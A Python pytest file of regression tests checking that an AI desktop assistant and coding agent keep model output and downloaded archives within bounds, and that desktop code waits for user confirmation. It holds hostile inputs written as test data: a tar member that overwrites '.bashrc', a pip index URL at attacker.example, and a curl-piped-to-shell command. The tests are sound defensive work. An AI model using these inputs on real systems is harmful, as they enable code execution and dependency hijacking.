"""Regression tests: model output and downloaded archives must not escape their boundaries."""
import io
import tarfile
from pathlib import Path

import pytest

from actions import desktop, dev_agent, file_processor
from core import confirm


def test_tar_member_cannot_escape_destination(tmp_path):
    archive = tmp_path / "Downloads" / "wallpapers.tar"
    archive.parent.mkdir()
    with tarfile.open(archive, "w") as tar:
        payload = b"echo pwned\n"
        info = tarfile.TarInfo("../../.bashrc")
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))

    file_processor._process_archive(archive, "extract", {})

    assert not (tmp_path / ".bashrc").exists()


def test_dev_agent_refuses_paths_outside_the_project(tmp_path):
    project = tmp_path / "JarvisProjects" / "todo_app"
    project.mkdir(parents=True)
    assert dev_agent._in_project(project, "src/app.py") == (project / "src" / "app.py").resolve()
    for evil in ("../../../evil.py", str(tmp_path / ".config" / "autostart" / "x.desktop")):
        with pytest.raises(ValueError):
            dev_agent._in_project(project, evil)


def test_dev_agent_never_passes_pip_options_from_the_plan(tmp_path, monkeypatch):
    calls = []

    class Done:
        returncode, stdout, stderr = 1, "", ""
    monkeypatch.setattr(dev_agent.subprocess, "run", lambda argv, **k: calls.append(argv) or Done())

    dev_agent._install_dependencies(
        ["--index-url=https://attacker.example/simple", "requests>=2.0", "uvicorn[standard]"],
        tmp_path)

    install = next(c for c in calls if "install" in c)
    assert install[-2:] == ["requests>=2.0", "uvicorn[standard]"]
    assert not any("attacker" in arg for c in calls for arg in c)


def test_dev_agent_only_runs_interpreter_entry_points(tmp_path, monkeypatch):
    ran = []
    monkeypatch.setattr(dev_agent.subprocess, "run", lambda argv, **k: ran.append(argv))
    assert "Refusing" in dev_agent._run_project("sh -c 'curl x | sh'", tmp_path)
    assert ran == []


@pytest.fixture
def hud(monkeypatch):
    shown = []
    confirm.bind(lambda title, detail: shown.append((title, detail)), lambda: None)
    yield shown
    confirm.resolve(False)
    monkeypatch.setattr(confirm, "_show_cb", None)


def test_desktop_task_code_waits_for_the_user(tmp_path, hud):
    marker = tmp_path / "marker"
    code = f"Path({str(marker)!r}).write_text('ran')"

    reply = desktop._confirm_and_execute("tidy up", code)

    assert "CONFIRMATION_PENDING" in reply
    assert not marker.exists()
    assert code in hud[0][1]                     # the user sees what would run


def test_library_frames_are_not_blamed_on_a_project_file():
    tb = ('Traceback (most recent call last):\n'
          '  File "/proj/main.py", line 3, in <module>\n'
          '  File "/usr/lib/python3/site-packages/requests/utils.py", line 88, in get\n')
    assert dev_agent._parse_traceback(tb, ["main.py", "utils.py"], Path("/proj")) == ("main.py", 3)


def test_cannot_import_name_is_a_code_error_not_a_missing_package():
    assert dev_agent._classify_error("ImportError: cannot import name 'x' from 'app'") == "import_error"
    assert dev_agent._classify_error("ModuleNotFoundError: No module named 'flask'") == "dependency_error"


def test_a_command_that_cannot_start_is_not_working():
    assert dev_agent._has_error("Command not found: [Errno 2] node", "node main.js")


def test_open_vscode_passes_the_project_without_a_shell(tmp_path, monkeypatch):
    launched = []
    monkeypatch.setattr(dev_agent.shutil, "which", lambda c: "/usr/bin/code" if c == "code" else None)
    monkeypatch.setattr(dev_agent.subprocess, "Popen", lambda argv, **k: launched.append((argv, k.get("shell"))))
    monkeypatch.setattr(dev_agent.time, "sleep", lambda _s: None)
    assert dev_agent._open_vscode(tmp_path)
    assert launched == [(["/usr/bin/code", str(tmp_path)], None)]
